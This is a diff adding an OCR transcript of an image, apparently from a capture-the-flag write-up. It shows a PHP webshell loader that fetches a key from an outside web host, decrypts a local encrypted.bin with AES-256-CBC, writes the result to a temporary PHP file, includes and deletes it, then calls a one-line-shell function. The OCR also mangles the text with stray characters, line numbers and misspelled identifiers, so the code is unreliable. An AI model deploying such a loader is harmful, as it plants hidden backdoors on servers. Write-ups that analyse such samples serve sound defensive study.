@@ -1,0 +1,31 @@
+# OCR: 0ef2d5e6854d7a5543507bfa0e9c57c6.webp
+# 来源: .\02-WriteUp\2025\0ef2d5e6854d7a5543507bfa0e9c57c6.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:22
+
+界 园 A 东 伟 M 土
+16
+11
+12
+13
+14
+15
+16
+17
+<?php
+$a=file_get_contents( ‘https: //forené.atwebpages .con/woyao/eat/ 火 锅 / 蜂 蜜 锅 底 css1);
+$bzmd5 ($a, true);
+$c=file_get_contents('../../../../encrypted.bin");
+$d=base64_decode($c);
+$e='aes-256-cbc';
+$f=openss1_cipher_iv_length($e);
+$g=substr ($d,0,$F);
+$h=substr ($d, $F) ;
+$i=openss1_decrypt($h, $e, $b, OPENSSL_RAW_DATA, $g);
+$j=sys_get_temp_dir();
+$k=$j.'/func_'.uniqid().‘.php';
+file_put_contents($k,"<?php\n".$i);
+include $k;
+unlink($k) ;
+yijuhua() 5
+?>
